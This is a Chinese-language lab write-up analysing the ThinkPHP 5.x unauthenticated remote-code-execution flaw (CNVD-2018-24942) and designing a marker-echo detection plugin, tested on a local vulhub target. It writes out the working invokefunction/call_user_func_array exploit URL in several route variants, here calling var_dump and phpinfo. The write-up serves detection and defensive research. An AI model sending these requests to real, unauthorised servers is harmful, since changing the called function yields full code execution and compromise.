# CNVD-2018-24942(ThinkPHP 5.x RCE)漏洞分析与响应特征检测设计

> 作者:PoC-Forge 项目 | 实验日期:2026-10-10 | 环境:本地隔离靶场(vulhub)
>
> **TL;DR**:ThinkPHP 5.x 在未开启强制路由(默认配置)时,未正确处理控制器名,导致兼容模式 URL 可以反射调用框架核心类的任意公开方法,构成未认证 RCE。PoC-Forge 插件 `thinkphp5_invoke` 采用**响应特征检测**:诱导框架调用 `var_dump` 回显唯一标记,响应含标记即判定存在漏洞;全程无副作用。检测结果以 4 靶场 × 3 插件的 12 格期望矩阵回归验证(12/12 通过)。
>
> **授权声明**:本文所有实验均在本地 Docker 靶场内进行,未向任何未授权系统发送攻击流量。

## 1. 漏洞背景

| 项目 | 内容 |
|------|------|
| 编号 | CNVD-2018-24942(修复绕过的后续记录见 CVE-2018-20062) |
| 组件 | ThinkPHP 5.x |
| 影响版本 | 5.0.22 / 5.1.29 及之前的未修复版本(vulhub 环境标题口径) |
| 修复版本 | 5.0.23 / 5.1.31 |
| 危害 | 未认证远程代码执行 |
| 实验环境 | ThinkPHP 5.0.20(vulhub/thinkphp:5.0.20),HTTP 8082 端口 |

根因引用(vulhub README 原话):"由于没有正确处理控制器名,导致在网站没有开启强制路由的情况下(**即默认情况下**)可以执行任意方法"——默认配置即受影响,这是它当年影响面巨大的原因。

## 2. 原理链条

```
GET /index.php?s=/Index/\think\app/invokefunction
        &function=call_user_func_array
        &vars[0]=var_dump&vars[1][]=pocforge_t6marker
        │
        ▼  兼容模式路由:框架按 / 拆分 s 参数,逐级定位 模块/控制器/方法
   控制器名 "\think\app" 实为框架核心类(非合法业务控制器)
        │
        ▼  控制器名未过滤 → 解析失败后的宽容处理
   App::invokeFunction("\think\app", "invokefunction", [...])
        │  反射:URL 字符串被当作"类名::方法名"直接调用
        ▼
   call_user_func_array("var_dump", ["pocforge_t6marker"])
        │
        ▼  函数输出被捕获进 HTTP 响应
   string(17) "pocforge_t6marker"    ← 攻击者的数据被"执行"了出来
```

这是本项目分析过的第三次"**数据变代码**"(对照:L1 Content-Type 思考题、L5 Log4j2 lookup)——URL(数据)被框架当成了可调用对象(代码),注入类漏洞的统一本质再次得到验证。

## 3. 检测设计

### 3.1 路线选择:响应特征

| 路线 | 在本漏洞上的表现 |
|------|-----------------|
| 文件落地 | `call_user_func_array` 可写文件,但有目标侧副作用,check-only 理念下不用 |
| 回连式 | 本漏洞无"目标外连"环节,回连信号无从产生 |
| **响应特征(选用)** | 调用结果直接进入响应,证据即响应本身;完全被动、零出网要求、零副作用 |

### 3.2 两级信号设计

1. **marker_echo(优先)**:调用 `var_dump` 回显唯一标记 `pocforge_t6marker`。该字符串是我们随机生成、不会与任何页面固有内容撞车的标记——响应中出现它,等价于"框架替我们执行了任意函数",确定性最强,且语义上证明的是"**任意方法调用**"而不只是"phpinfo 可用";
2. **phpinfo_signature(兜底)**:请求 phpinfo 并检查响应中的 `PHP Version` + `Configuration` 双特征。信息量弱于标记回显,但兼容标记方案失效的极端场景。

实测中两级信号同时命中(见 4.3),插件把 4 条匹配全部写入证据。

## 4. 实验记录

### 4.1 环境与适配

靶场启动时报 `Bind for 0.0.0.0:8080 failed: port is already allocated`(与本项目 Tomcat PUT 靶场端口冲突),将 compose 映射调整为 `8082:80` 后正常。环境适配过程本身记录在案——**可复现性是实验记录的一部分**。

### 4.2 路由变体矩阵

4 种兼容模式 URL 写法 × 2 种载荷,逐一实测(2026-10-10):

| 路由写法 | var_dump 标记回显 | phpinfo |
|----------|------------------|---------|
| `s=/Index/\think\app/invokefunction` | ✅ 200,30 字节,含标记 | ✅ 200,~92.5KB |
| `s=/index/\think\app/invokefunction` | ✅ 200,30 字节,含标记 | ✅ 200,~92.5KB |
| `s=index/\think\app/invokefunction` | ✅ 200,30 字节,含标记 | ✅ 200,~92.5KB |
| `s=index/think\app/invokefunction` | ✅ 200,30 字节,含标记 | ✅ 200,~92.5KB |

结论:该环境(5.0.20)对大小写与前导斜杠宽容,四种写法全部有效;插件保留多变体是为兼容不同子版本,并非冗余。

> 调试插曲:curl 的 `-s` 参数会吞掉错误——URL 中 `vars[1][]` 的空方括号触发 curl URL 通配符报错导致"零输出",加 `-g`(globoff)后恢复。工具静默失败是排查大敌。

### 4.3 插件判定输出(2026-10-10T17:02:14)

```json
{
  "plugin": "thinkphp5_invoke",
  "target": "http://localhost:8082",
  "status": "VULNERABLE",
  "evidence": { "matches": [
    { "signal": "marker_echo", "path": "/index.php?s=/Index/\\think\\app/invokefunction&...",
      "snippet": "string(17) \"pocforge_t6marker\"" },
    { "signal": "marker_echo", "path": "/index.php?s=index/\\think\\app/invokefunction&...",
      "snippet": "string(17) \"pocforge_t6marker\"" },
    { "signal": "phpinfo_signature", "path": "...vars[0]=phpinfo...", "snippet": "phpinfo page detected" },
    { "signal": "phpinfo_signature", "path": "...vars[0]=phpinfo...", "snippet": "phpinfo page detected" }
  ]}
}
```

### 4.4 负面对照(有价值的意外发现)

同一请求打向干净 Tomcat(8081),返回 **400 Bad Request**:

```
java.lang.IllegalArgumentException: Invalid character found in the request target
[...vars[1][]=pocforge_t6marker]. The valid characters are defined in RFC 7230 and RFC 3986
```

Tomcat 对请求行中的非法字符(`\` 等)按 RFC 7230 直接拒绝整个请求——与 PHP/Apache 接受同样原始字节形成鲜明对比。**不同服务对同一畸形请求的不同反应,本身就是指纹级差异**;插件在该目标正确输出 NOT_FOUND(400 响应中无标记)。

### 4.5 期望矩阵回归

4 靶场(8080 Tomcat PUT 靶场 / 8081 干净 Tomcat / 8983 Log4j2 靶场 / 8082 ThinkPHP 靶场)× 3 插件 = 12 格,对角线 3 个 VULNERABLE、其余 9 格 NOT_FOUND,`bash verify.sh` 输出 `REGRESSION OK (12/12)`。

## 5. 已知限制与误报/漏报分析

1. **WAF 拦截 `s=` 参数**:请求到不了脆弱路由 → 无标记回显 → **漏报**(NOT_FOUND);
2. **响应改写/自定义报错页**:若漏洞触发的输出路径变化,标记可能不出现 → 漏报;
3. **输出捕获差异**:若目标 PHP 配置改变输出缓冲行为,var_dump 输出可能不进响应体 → 兜底 phpinfo 信号可部分覆盖;
4. 以上均为漏报方向;响应特征路线无主动交互,误报风险主要来自"页面恰好包含 PHP Version + Configuration"的极端巧合,唯一标记回显信号不受此影响。

## 6. 修复背景

- 升级 5.0.23 / 5.1.31:框架对控制器名增加过滤(正则拦截 `\think\` 等核心类命名空间的调用);
- 部署侧缓解:开启强制路由;WAF 拦截 `s=` 参数(部署缓解,非代码修复);
- **CVE-2018-20062**:记录了上述修复在特定场景下仍可被绕过——"修复 → 绕过 → 再修复"的典型攻防循环案例。

## 7. 结论

- ThinkPHP 5.x RCE 与 Log4Shell 同源:框架对"外部输入"的宽容处理让数据获得了代码的执行权;
- 响应特征检测以零副作用、零出网要求换取高确定性(var_dump 唯一标记回显),适合作为无外连环节漏洞的首选路线;
- 负面对照中的 400 拒绝提示:负样本的行为同样携带信息(Tomcat 的严格请求行校验 vs Apache 的宽容),检测工程应把"对照组观察"纳入证据链。

## 参考

- vulhub 环境:https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
- ThinkPHP 官方讨论:thinkphp.cn/topic/60400、thinkphp.cn/topic/60390
- 先知社区分析:https://xz.aliyun.com/t/3570
- CNVD-2018-24942;CVE-2018-20062
